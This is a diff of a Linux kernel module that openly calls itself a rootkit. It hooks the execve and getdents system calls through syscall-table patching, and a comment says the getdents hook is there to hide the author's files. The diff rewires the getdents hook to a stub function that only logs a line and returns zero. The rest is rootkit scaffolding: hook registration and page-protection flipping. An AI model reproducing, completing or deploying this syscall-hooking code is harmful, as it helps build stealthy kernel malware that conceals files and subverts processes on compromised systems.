@@ -56,6 +56,23 @@ MODULE_PARM_DESC(root_uid, "Root UID");
  */
 static char* magic_prefix;
 
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp) {//, unsigned int count) {
+  // int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+  // t_syscall_hook *getdents_hook;
+
+  // //Find the t_syscall_hook for __NR_getdents from our linked list
+  // getdents_hook = find_syscall_hook(__NR_getdents);
+  // //And cast the orig_func void pointer into the orig_func to be invoked
+  // orig_func = (void*) getdents_hook->orig_func;
+
+  printk(KERN_INFO "getdents was called\n");
+
+  //Invoke the original syscall
+  return 0;//(*orig_func)(fd, dirp, count);
+}
+
+
+
 /*
  * RW/RO page flip code borrowed from Cormander's TPE-LKM code.
  * Simplified for our purpose, i.e. one kernel version, one arch.
@@ -236,7 +253,7 @@ int init_module(void)
   //********
   hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   // Let's hook getdents() to hide our files
-  hook_syscall(new_hook(__NR_getdents, (void*) &zxn));
+  hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));
 
 
   printk(KERN_INFO "Rootkit module is loaded!\n");
@@ -331,18 +348,4 @@ asmlinkage int new_execve(const char *filename, char *const argv[], char *const 
   return (*orig_func)(filename, argv, envp);
 }
 
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp) {//, unsigned int count) {
-  // int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-  // t_syscall_hook *getdents_hook;
-
-  // //Find the t_syscall_hook for __NR_getdents from our linked list
-  // getdents_hook = find_syscall_hook(__NR_getdents);
-  // //And cast the orig_func void pointer into the orig_func to be invoked
-  // orig_func = (void*) getdents_hook->orig_func;
-
-  printk(KERN_INFO "getdents was called\n");
-
-  //Invoke the original syscall
-  return 0;//(*orig_func)(fd, dirp, count);
-}
 
